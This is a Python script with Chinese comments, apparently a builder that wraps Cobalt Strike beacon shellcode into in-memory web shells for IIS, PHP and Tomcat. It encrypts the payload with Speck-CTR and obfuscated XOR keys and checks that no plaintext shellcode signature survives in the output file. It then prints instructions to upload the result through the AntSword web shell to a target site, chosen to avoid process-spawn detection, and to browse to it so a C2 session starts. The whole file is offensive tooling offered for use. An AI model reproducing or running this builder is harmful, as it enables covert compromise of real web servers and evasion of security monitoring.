#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
make_beacon.py —— CS 载荷内存马一键生成器（ASPX / PHP / JSP）
================================================================================
设计原则：**不碰 C2 配置**。CS 导出 stager/beacon 时已把 host、port、profile（URI/UA/心跳）
和 stager 密钥全部编进 .c —— 工具只负责"加密 + 包成内存马"，不改任何 C2 信息。
要换 C2 就在 CS 里换监听器重新导出 .c（这样 URI/UA/profile 也会同步，不会出现"IP 对了却连不上"）。

三种载体都在**站点自身进程内**完成"解密 → VirtualAlloc(RW) → 写入 → 改 RX → CreateThread"，
不产生新进程、不经 cmd。

用法:
  python make_beacon.py --aspx --shellcode aaa.c        :: .NET / IIS   -> mem.aspx
  python make_beacon.py --php  --shellcode aaa.c        :: php-cgi/fpm  -> mem.php
  python make_beacon.py --jsp  --shellcode aaa.c        :: Tomcat/Java  -> mem.jsp
  python make_beacon.py --aspx --shellcode beacon.bin --bin --out x.aspx
"""
import argparse
import base64
import hashlib
import os
import random
import re
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from payload_gen import speck_ctr_xor, poskey_xor                    # noqa: E402
from templates import ASPAX_TEMPLATE, PHP_TEMPLATE, JSP_TEMPLATE     # noqa: E402

KINDS = {
    "aspx": dict(ext=".aspx", default="mem.aspx", proc="w3wp.exe（IIS 工作进程）"),
    "php":  dict(ext=".php",  default="mem.php",  proc="php-cgi / php-fpm（网站 PHP 进程）"),
    "jsp":  dict(ext=".jsp",  default="mem.jsp",  proc="java.exe（Tomcat 进程）"),
}


def parse_c_array(path):
    raw = open(path, "rb").read()
    text = None
    for enc in ("utf-8-sig", "utf-8", "gbk", "latin-1"):
        try:
            text = raw.decode(enc)
            break
        except Exception:
            continue
    if text is None:
        raise SystemExit("[!] 无法解码 %s" % path)
    hits = re.findall(r"\\x([0-9a-fA-F]{2})", text)
    if not hits:
        raise SystemExit("[!] %s 里没有 \\xNN 形式的 shellcode" % path)
    return bytes(int(h, 16) for h in hits)


def main():
    ap = argparse.ArgumentParser(description="CS 载荷内存马生成器（aspx/php/jsp）")
    ap.add_argument("--shellcode", required=True, help="CS 导出的 aaa.c（或 .bin 配合 --bin）")
    ap.add_argument("--bin", action="store_true", help="输入是裸 shellcode 二进制")
    for k in KINDS:
        ap.add_argument("--" + k, action="store_true", help="生成 %s 内存马" % KINDS[k]["ext"])
    ap.add_argument("--out", default=None, help="输出文件名（默认 mem.<ext>）")
    a = ap.parse_args()

    kind = next((k for k in KINDS if getattr(a, k)), "aspx")
    if not a.out:
        a.out = KINDS[kind]["default"]

    src = os.path.abspath(a.shellcode)
    data = open(src, "rb").read() if a.bin else parse_c_array(src)
    print("[1/3] 载荷 : %s  %d 字节  明文sha256=%s…" % (src, len(data), hashlib.sha256(data).hexdigest()[:32]))
    print("[2/3] 加密 : Speck64/128-CTR + 位置相关 XOR（密钥混淆、运行时反推；明文不落盘）")

    rnd = random.Random(os.urandom(32))
    kx = bytes(rnd.randrange(256) for _ in range(32))
    kb = bytes(rnd.randrange(256) for _ in range(16))
    nonce = rnd.randrange(1, 0xFFFFFFFF)
    mask = bytes(rnd.randrange(256) for _ in range(8))
    ax, ar = rnd.randrange(8), rnd.randrange(8)

    enc = speck_ctr_xor(poskey_xor(data, kx), kb, nonce)
    kxo = bytes((kx[i] ^ mask[(i + ax) & 7] ^ ((i * 0x1D) & 0xFF)) & 0xFF for i in range(32))
    kbo = bytes((kb[i] ^ mask[(i + ar) & 7] ^ ((i * 0x2B) & 0xFF)) & 0xFF for i in range(16))

    rkx = bytes((kxo[i] ^ mask[(i + ax) & 7] ^ ((i * 0x1D) & 0xFF)) & 0xFF for i in range(32))
    rkb = bytes((kbo[i] ^ mask[(i + ar) & 7] ^ ((i * 0x2B) & 0xFF)) & 0xFF for i in range(16))
    if rkx != kx or rkb != kb or poskey_xor(speck_ctr_xor(enc, rkb, nonce), rkx) != data:
        print("[!] 生成期自校验失败，已中止")
        return 1

    b64 = base64.b64encode
    if kind == "aspx":
        block = "\n".join([
            '        static string ENC64 = "%s";' % b64(enc).decode(),
            '        static string KXO64 = "%s";' % b64(kxo).decode(),
            '        static string KBO64 = "%s";' % b64(kbo).decode(),
            '        static string MSK64 = "%s";' % b64(mask).decode(),
            '        static byte[] ENC = Convert.FromBase64String(ENC64);',
            '        static byte[] KXO = Convert.FromBase64String(KXO64);',
            '        static byte[] KBO = Convert.FromBase64String(KBO64);',
            '        static byte[] MSK = Convert.FromBase64String(MSK64);',
            "        static uint NONCE = 0x%08Xu;" % nonce,
            "        static byte[] KeyX(byte[] o) { byte[] r = new byte[o.Length]; for (int i = 0; i < o.Length; i++) r[i] = (byte)(o[i] ^ MSK[(i + %d) %% 8] ^ (byte)((i * %d) & 0xFF)); return r; }" % (ax, 0x1D),
            "        static byte[] KeyB(byte[] o) { byte[] r = new byte[o.Length]; for (int i = 0; i < o.Length; i++) r[i] = (byte)(o[i] ^ MSK[(i + %d) %% 8] ^ (byte)((i * %d) & 0xFF)); return r; }" % (ar, 0x2B),
        ])
        text = ASPAX_TEMPLATE.replace("__PAYLOAD__", block)
        text = text.replace("byte[] pt = Decrypt(ENC, KB, KX, NONCE);",
                            "byte[] pt = Decrypt(ENC, KeyB(KBO), KeyX(KXO), NONCE);")
        newline = "\r\n"
    elif kind == "php":
        text = (PHP_TEMPLATE
                .replace("__ENC__", b64(enc).decode()).replace("__KXO__", b64(kxo).decode())
                .replace("__KBO__", b64(kbo).decode()).replace("__MSK__", b64(mask).decode())
                .replace("__NONCE__", "0x%08X" % nonce).replace("__AX__", str(ax)).replace("__AR__", str(ar)))
        newline = "\n"
    else:
        text = (JSP_TEMPLATE
                .replace("__ENC__", enc.hex()).replace("__KXO__", kxo.hex())
                .replace("__KBO__", kbo.hex()).replace("__MSK__", mask.hex())
                .replace("__NONCE__", str(nonce)).replace("__AX__", str(ax)).replace("__AR__", str(ar)))
        newline = "\n"

    out = os.path.abspath(a.out)
    open(out, "w", encoding="utf-8", newline=newline).write(text)
    blob = open(out, "rb").read()
    print("[3/3] 生成 : %s  (%d 字节)" % (out, len(blob)))
    print("      sha256              : %s" % hashlib.sha256(blob).hexdigest())
    print("      密文 %d 字节         : sha256=%s…" % (len(enc), hashlib.sha256(enc).hexdigest()[:24]))
    print("      文件内无明文 shellcode : %s" % ("通过" if bytes.fromhex("fc4883e4f0") not in blob else "!! 发现明文"))
    print("      C2 配置             : 未改动，使用 .c 里 CS 导出时编好的 host/port/profile")
    print()
    print("投放（不要经过 webshell 命令行，避免触发「网站进程派生新进程」类拦截）：")
    print("  1) 用蚁剑【文件管理】上传到网站目录")
    print("  2) 浏览器访问 http://<目标>/%s" % os.path.basename(out))
    print("  3) 页面返回 ok 即已在站点进程内执行；去 CS 看会话（进程应为 %s）" % KINDS[kind]["proc"])
    if kind == "php":
        print("  前置条件：PHP >= 7.4 且 ffi.enable=1（页面会打印 no-ffi 表示不可用）")
    if kind == "jsp":
        print("  前置条件：classpath 有 JNA（com.sun.jna）（页面会打印 no-jna 表示不可用）")
    print("  注意：页面每次访问都会新起一条 beacon —— 用完请手动删除。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
